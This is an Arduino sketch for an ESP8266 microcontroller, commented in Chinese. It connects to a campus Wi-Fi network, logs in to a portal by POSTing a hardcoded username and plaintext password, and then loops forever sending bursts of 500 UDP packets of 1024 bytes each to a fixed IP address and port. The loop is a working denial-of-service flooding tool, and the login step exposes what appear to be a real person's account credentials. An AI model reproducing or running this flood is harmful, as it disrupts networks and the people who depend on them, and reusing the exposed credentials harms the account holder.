#include <ESP8266WiFi.h>
#include <WiFiUdp.h>
#include <ESP8266HTTPClient.h>

const char* ssid = "WUST-WiFi6";

const char* target_ip = "223.1.1.1";
const int target_port = 6666;

const int packet_size = 1024;
const int packets_per_second = 500;

const int ledPin = LED_BUILTIN;  // 板载 LED

WiFiUDP udp;

void setup() {

  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, HIGH);

  Serial.begin(115200);
  WiFi.begin(ssid); // 不设置密码，直接连接

  Serial.print("连接到 ");
  Serial.println(ssid);

  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }

  Serial.println("");
  Serial.println("连接成功！");
  Serial.print("IP地址: ");
  Serial.println(WiFi.localIP());


    if (WiFi.status() == WL_CONNECTED) {
    HTTPClient http;
    WiFiClient client;  // 创建WiFiClient实例

    http.begin(client,"http://59.68.177.9/api/account/login");
    http.addHeader("Content-Type", "application/x-www-form-urlencoded"); // 设置POST类型

    // 发送POST请求
    String postData = "username=202313407369&password=lxt771120&nasId=2";
    int httpResponseCode = http.POST(postData);

    if (httpResponseCode > 0) {
      String response = http.getString(); // 获取返回结果
      Serial.print("认证成功，返回码: ");
      Serial.println(httpResponseCode);
      Serial.println("返回内容:");
      Serial.println(response);
    } else {
      Serial.print("HTTP请求失败，错误码: ");
      Serial.println(httpResponseCode);
    }

    http.end(); // 结束请求
  }

}

void loop() {
  // digitalWrite(ledPin, LOW);  // 开启 LED，表示正在发送
  for (int i = 0; i < packets_per_second; i++) {
    udp.beginPacket(target_ip, target_port);
    for (int j = 0; j < packet_size; j++) {
      udp.write('x');
    }
    udp.endPacket();
  }
  delay(500);
  digitalWrite(ledPin, HIGH);
}
